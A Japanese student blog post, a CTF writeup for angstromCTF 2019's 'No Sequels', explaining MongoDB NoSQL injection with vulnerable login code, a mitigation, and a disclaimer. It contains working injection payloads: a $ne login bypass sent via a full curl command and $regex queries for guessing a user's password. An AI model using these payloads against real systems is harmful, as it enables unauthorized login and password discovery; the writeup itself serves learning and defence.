@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8"/>
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
+	<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+	<meta name="Keywords"  content="iOS,safari,iphone,ipad" />
+	<title>クロワッサンはやっぱり黒くない</title>
+	<link href="https://fonts.googleapis.com/earlyaccess/roundedmplus1c.css" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" />
+	<link rel="stylesheet" href="/croissant/css/style.css"/>
+</head>
+<body>
+	<header>
+		<img src="http://wassan128.github.io/img/icon.png"/>
+		<h1><a href="/croissant/">クロワッサンはやっぱり黒くない</a></h1>
+		<h3>とある高専生の備忘録 - 2nd season</h3>
+	</header>
+	<main>
+
+<article><h1>NoSQL injectionの話</h1>
+
+<p>自分用学習記録。
+<a href="https://2019.angstromctf.com/" rel="nofollow">angstrom CTF 2019</a>で出題された<a href="https://nosequels.2019.chall.actf.co/login" rel="nofollow">No Sequels</a>というWeb問題の解法を交えつつ、どんなものなのか、対策も含めて書く。この問題ではMongoDBが使われていたため、具体例ではMongoDBを取り扱う。</p>
+
+<p>(言うまでもありませんが、このサイトで紹介しているのはあくまでCTFのWriteupです。自分の管理下にない他人のサイトに許可なく実行しないでください)</p>
+
+<h2>NoSQL Injectionとは</h2>
+
+<p>NoSQL(Not only SQL)に対するInjection攻撃の総称である。SQL Injectionが所謂RDB(Relational DataBase)に対する攻撃であるのに対し、NoSQL Injectionにおける攻撃対象はMongoDBやRedisといったRDBに分類されないNoSQLデータベースである。例えばMongoDBではデータの保存にJSON形式を用いる。これにより、リアルタイム性や拡張性、柔軟性が高いだけでなく、従来のSQL Injection攻撃が通らないなどのメリットがある。</p>
+
+<p>しかしながら無論セキュリティリスクがないわけではない。その一つがNoSQL Injectionである。</p>
+
+<h2>MongoDBにおけるデータ</h2>
+
+<h3>保存形式</h3>
+
+<p>前述の通り、JSON形式で保存される。RDBで言うテーブルであるところの「コレクション」に、「ドキュメント」と呼ばれるオブジェクトが挿入される。以下にドキュメントの具体例を示す。</p>
+<pre style="color:#e7e9db;background-color:#2f1e2e">{
+    <span style="color:#5bc4bf">&#34;username&#34;</span>: <span style="color:#48b685">&#34;user&#34;</span>,
+    <span style="color:#5bc4bf">&#34;password&#34;</span>: <span style="color:#48b685">&#34;user&#39;s password&#34;</span>
+}
+</pre>
+<h3>取得方法</h3>
+
+<p>このドキュメントが<code>users</code>コレクションに挿入されている状況では、例えば以下のクエリでこのドキュメントを取得できる。</p>
+<pre style="color:#e7e9db;background-color:#2f1e2e"><span style="color:#815ba4">const</span> <span style="color:#06b6ef">query</span> <span style="color:#5bc4bf">=</span> {
+    <span style="color:#48b685">&#34;username&#34;</span><span style="color:#5bc4bf">:</span> <span style="color:#48b685">&#34;user&#34;</span>,
+    <span style="color:#48b685">&#34;password&#34;</span><span style="color:#5bc4bf">:</span> <span style="color:#48b685">&#34;user&#39;s password&#34;</span>
+};
+
+<span style="color:#06b6ef">db</span>.<span style="color:#06b6ef">collection</span>(<span style="color:#48b685">&#34;users&#34;</span>).<span style="color:#06b6ef">findOne</span>(<span style="color:#06b6ef">query</span>, (<span style="color:#06b6ef">err</span>, <span style="color:#06b6ef">user</span>) =&gt; {
+    <span style="color:#776e71">// something to do
+</span><span style="color:#776e71"></span>});
+</pre>
+<h2>MongoDBに対するNoSQL Injection(No Sequels writeup)</h2>
+
+<p>今回の例題No Sequelsでは、POST経由で受け取ったパラメータをクエリ構築に用いていた。具体的には次のコードのようになっていた。</p>
+<pre style="color:#e7e9db;background-color:#2f1e2e"><span style="color:#06b6ef">router</span>.<span style="color:#06b6ef">post</span>(<span style="color:#48b685">&#39;/login&#39;</span>, <span style="color:#06b6ef">verifyJwt</span>, <span style="color:#815ba4">function</span> (<span style="color:#06b6ef">req</span>, <span style="color:#06b6ef">res</span>) {
+    <span style="color:#776e71">// monk instance
+</span><span style="color:#776e71"></span>    <span style="color:#815ba4">var</span> <span style="color:#06b6ef">db</span> <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">req</span>.<span style="color:#06b6ef">db</span>;
+
+    <span style="color:#815ba4">var</span> <span style="color:#06b6ef">user</span> <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">req</span>.<span style="color:#06b6ef">body</span>.<span style="color:#06b6ef">username</span>;
+    <span style="color:#815ba4">var</span> <span style="color:#06b6ef">pass</span> <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">req</span>.<span style="color:#06b6ef">body</span>.<span style="color:#06b6ef">password</span>;
+
+    <span style="color:#815ba4">if</span> (<span style="color:#5bc4bf">!</span><span style="color:#06b6ef">user</span> <span style="color:#5bc4bf">||</span> <span style="color:#5bc4bf">!</span><span style="color:#06b6ef">pass</span>){
+        <span style="color:#06b6ef">res</span>.<span style="color:#06b6ef">send</span>(<span style="color:#48b685">&#34;One or more fields were not provided.&#34;</span>);
+    }
+    <span style="color:#815ba4">var</span> <span style="color:#06b6ef">query</span> <span style="color:#5bc4bf">=</span> {
+        <span style="color:#06b6ef">username</span><span style="color:#5bc4bf">:</span> <span style="color:#06b6ef">user</span>,
+        <span style="color:#06b6ef">password</span><span style="color:#5bc4bf">:</span> <span style="color:#06b6ef">pass</span>
+    }
+
+    <span style="color:#06b6ef">db</span>.<span style="color:#06b6ef">collection</span>(<span style="color:#48b685">&#39;users&#39;</span>).<span style="color:#06b6ef">findOne</span>(<span style="color:#06b6ef">query</span>, <span style="color:#815ba4">function</span> (<span style="color:#06b6ef">err</span>, <span style="color:#06b6ef">user</span>) {
+        <span style="color:#815ba4">if</span> (<span style="color:#5bc4bf">!</span><span style="color:#06b6ef">user</span>){
+            <span style="color:#06b6ef">res</span>.<span style="color:#06b6ef">send</span>(<span style="color:#48b685">&#34;Wrong username or password&#34;</span>);
+            <span style="color:#815ba4">return</span>
+        }
+
+        <span style="color:#06b6ef">res</span>.<span style="color:#06b6ef">cookie</span>(<span style="color:#48b685">&#39;token&#39;</span>, <span style="color:#06b6ef">jwt</span>.<span style="color:#06b6ef">sign</span>({<span style="color:#06b6ef">name</span><span style="color:#5bc4bf">:</span> <span style="color:#06b6ef">user</span>.<span style="color:#06b6ef">username</span>, <span style="color:#06b6ef">authenticated</span><span style="color:#5bc4bf">:</span> <span style="color:#815ba4">true</span>}, <span style="color:#06b6ef">secret</span>));
+        <span style="color:#06b6ef">res</span>.<span style="color:#06b6ef">redirect</span>(<span style="color:#48b685">&#34;/site&#34;</span>);
+    });
+});
+</pre>
+<p>POSTのデータ部分(<code>req.body.~</code>)をそのまま変数に代入し、<code>query</code>を構築している。存在する<code>user</code>及びその<code>pass</code>をデータとしてPOSTしてやれば、認証済みのcookieが発行され、<code>/site</code>にリダイレクトされることがわかる。</p>
+
+<p>さて、この問題を解くためNo SQL Injectionを用いるわけだが、ポイントはMongoDBではクエリをJSON形式で比較的自由に記述できる点である。例えば以下のようなクエリを記述できる。</p>
+<pre style="color:#e7e9db;background-color:#2f1e2e">{
+    <span style="color:#5bc4bf">&#34;username&#34;</span>: {<span style="color:#5bc4bf">&#34;$ne&#34;</span>: <span style="color:#48b685">&#34;&#34;</span>},
+    <span style="color:#5bc4bf">&#34;password&#34;</span>: {<span style="color:#5bc4bf">&#34;$ne&#34;</span>: <span style="color:#48b685">&#34;&#34;</span>}
+}
+</pre>
+<p><code>$ne</code>はMongoDBで使用できる比較演算子(他にもあるが本記事では割愛、<a href="https://docs.mongodb.com/manual/reference/operator/query/#query-selectors" rel="nofollow">参照元</a>)であり、意味合いとしては<code>!=</code>である。つまりこのクエリが意味するのは「ユーザー名が(空文字)ではない」「パスワードが(空文字)ではない」すべてのユーザーということになる。よって、ユーザーテーブル内のどれかのユーザーとしてログインすることができる。</p>
+
+<p>以上のことを踏まえ、以下のPOSTリクエストを考える。</p>
+<pre style="color:#e7e9db;background-color:#2f1e2e">$ curl -X POST https://nosequels.2019.chall.actf.co/login -b <span style="color:#48b685">&#34;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdXRoZW50aWNhdGVkIjpmYWxzZSwiaWF0IjoxNTU2MjQwNTAwfQ.nGR_1a2ojGWwqFAsaeKqf-qeh1viZidAZ5KZ6Zcn-3w&#34;</span> -H <span style="color:#48b685">&#34;Content-Type: application/json&#34;</span> -d <span style="color:#48b685">&#39;{&#34;username&#34;: {&#34;$ne&#34;: &#34;&#34;}, &#34;password&#34;: {&#34;$ne&#34;: &#34;&#34;}}&#39;</span> -Li
+</pre>
+<p><code>-H</code>パラメータでJSONデータの送信を指定し、<code>-d</code>でクエリを指定している部分である。また、<code>-b</code>パラメータで認証前のcookie(token)を指定、ログイン成功後にリダイレクトするため<code>-L</code>、認証後のヘッダ情報から認証後のcookieを確認するため<code>-i</code>を指定している。
+レスポンスのtoken=~の部分を新たにcookieとしてセットして<code>/site</code>にアクセスするとNo Sequelsのフラグが得られる。</p>
+
+<h2>余談</h2>
+
+<p>この問題にはNo Sequels 2という続編問題がある。上記cookieでアクセスした<code>/site</code>で、ユーザーadminのパスワードを入力してログインしろ、という内容である。そこでふと「このユーザーテーブルにはadmin以外のユーザーはいないのだろうか」と疑問に思い、次のクエリをPOSTした。</p>
+<pre style="color:#e7e9db;background-color:#2f1e2e">{
+    <span style="color:#5bc4bf">&#34;username&#34;</span>: {<span style="color:#5bc4bf">&#34;$ne&#34;</span>: <span style="color:#48b685">&#34;admin&#34;</span>},
+    <span style="color:#5bc4bf">&#34;password&#34;</span>: {<span style="color:#5bc4bf">&#34;$ne&#34;</span>: <span style="color:#48b685">&#34;&#34;</span>}
+}
+</pre>
+<p>これでadmin以外のユーザーが存在すればそのどれかでログインされるわけだが、結果としてnormieというユーザーでログインすることができた。normieのパスワードは以下のようなクエリで地道に調べることができる。</p>
+<pre style="color:#e7e9db;background-color:#2f1e2e">{
+    <span style="color:#5bc4bf">&#34;username&#34;</span>: <span style="color:#48b685">&#34;normie&#34;</span>,
+    <span style="color:#5bc4bf">&#34;password&#34;</span>: {<span style="color:#5bc4bf">&#34;$regex&#34;</span>: <span style="color:#48b685">&#34;^a&#34;</span>}
+}
+</pre>
+<p>passwordの部分の<code>$regex</code>は正規表現の記述を表している。この場合、パスワードが<code>a</code>で始まるならログインに成功し、そうでない場合は<code>Wrong username or password</code>が返される。ちなみにnormieのパスワードは<code>pass</code>だった(適当に当たりをつけて<code>^p</code>とやったら通ってしまい、割とエスパーで解いてしまったので特にスクリプトは組んでいない)。現時点(<sup>4</sup>⁄<sub>26</sub>)で上がっている<a href="https://ctftime.org/task/8354" rel="nofollow">ctftimeのwriteup</a>ではadminのパスワードを探索しており、normieを見かけなかったので余談として残す。</p>
+
+<h2>対策</h2>
+
+<p>パラメータとして受け取った値をそのままクエリに使わないことである。今回の例であれば、単純に受け取ったパラメータを<code>String()</code>で文字列に変換するだけでも防げると思われる。</p>
+
+<h2>まとめ</h2>
+
+<p>今回の問題を通してNo SQL Injectionについての理解が少し深まった。これからはこういう問題も増えていくかもしれないので、知識として覚えておきたい。</p>
+
+<h2>余談の余談</h2>
+
+<p>normieってなんだろうと気になって調べてみた。</p>
+
+<p><img src="normie.png"/></p>
+
+<h2>参考資料</h2>
+
+<p>・ångstromCTF <a href="https://2019.angstromctf.com/" rel="nofollow">https://2019.angstromctf.com/ </a></p>
+
+<p>・NoSQLであればノー・インジェクション? <a href="https://www.ibm.com/blogs/security/jp-ja/83/" rel="nofollow">https://www.ibm.com/blogs/security/jp-ja/83/</a></p>
+
+<p>・The MongoDB 4.0 Manual <a href="https://docs.mongodb.com/manual/reference/operator/query/#query-selectors" rel="nofollow">https://docs.mongodb.com/manual/reference/operator/query/#query-selectors</a></p>
+
+<p>・ctftime <a href="https://ctftime.org/task/8354" rel="nofollow">https://ctftime.org/task/8354</a></p>
+<aside><p class='post-date'>投稿日: 2019/04/25</p>
+</aside></article>
+	</main>
+	<footer>
+		<p>&copy; 2018 wassan128 / MeltDowner</p>
+	</footer>
+</body>
+</html>
+
+
